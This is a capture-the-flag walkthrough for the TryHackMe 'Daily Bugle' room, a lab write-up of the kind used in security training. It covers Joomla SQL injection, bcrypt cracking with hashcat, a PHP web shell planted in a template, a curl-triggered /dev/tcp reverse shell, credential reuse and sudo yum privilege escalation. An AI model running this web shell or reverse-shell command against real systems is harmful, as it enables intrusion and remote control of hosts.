# Daily Bugle

[Daily Bugle](https://tryhackme.com/room/dailybugle)

## Solution

- nmap scan 22, 80, 3306

3306 is for mysql

### Task 1

We can access the website on port 80 and if we read the article it says that
`SpiderMan` robbed the bank.

### Task 2

- What is the Joomla version?

I tried to use feroxbuster to enumerate some directories and tried to look into
sources, but I could not find a way to read the Joomla version. So I googled
"Joomla get version" and tried to search for something.

I found this question
`https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http`.
We can see the version from the path
`/administrator/manifests/files/joomla.xml`

The version is 3.7.0 is vulnerable to sql injection. I found
https://github.com/stefanlucas/Exploit-Joomla which managed to do the sql
injection. And we get the user.

```
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
```

We can run hashid on the password hash to identify the hash mode.

```
hashid -m '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
```

The hash is bcrypy mode 3200 so we can use hashcat

```
hashcat -m 3200 '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' /path/to/rockyou.txt
```

And we get `spiderman123`.

- bcrypt is very slow, so for the challenge you can also filter only 12 character passwords.

We can login as jonah on the http://<ip>/administrator page and then modify one
of the templates to include some php code that can help us (see
https://vulncheck.com/blog/joomla-for-rce).

I modified the `index.php` file by going to the nav menu Extensions ->
Templates -> Templates. Then choose the one that jonah created. And then modify
index.php by adding the following snippet.

```
<?php if (isset($_GET["cmd"])) system($_GET["cmd"]); ?>
```

After that we can curl a malicious payload and listen on nc

```
nc -lvnp 6969
```

```
curl -k 'http://<ip>/?cmd=%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<host>%2F6969%200%3E%261'
```

Now we have access to the machine.

#### The user flag

We can view all the files in the server directory. An interesting one is
`/var/www/html/configuration.php`. It contains an entry `public $password =
'nv5uz9r3ZEDzVjNu';` We can try to login as other users with that password. For
example we can try to login as jjameson with that password with `ssh
jjameson@<ip>` and then provide the password.

#### The root flag

We can see what sudo privilages we have because we have jjameson's password
with `sudo -l` and we get:

```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

In the hint of the challenge https://gtfobins.github.io/gtfobins/yum/

Follow the instructions for (b) and you will have an interactive shell for root.
